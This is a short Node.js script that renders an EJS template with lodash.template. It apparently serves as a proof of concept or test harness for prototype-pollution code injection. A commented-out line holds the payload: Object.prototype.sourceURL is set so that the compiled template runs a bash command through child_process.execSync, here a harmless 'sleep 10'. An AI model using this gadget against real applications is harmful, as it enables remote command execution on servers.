const lodash = require('lodash')
const fs = require('fs')


// Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'sleep 10'`)}\u000a//"

/**
 * Exported function call
 */
fs.readFile(__dirname+'/view/template.ejs', (err, content) => {
    let compiled = lodash.template(content)
    let rendered = compiled({
        language: 'a', 
        category: 'b'
    })
})
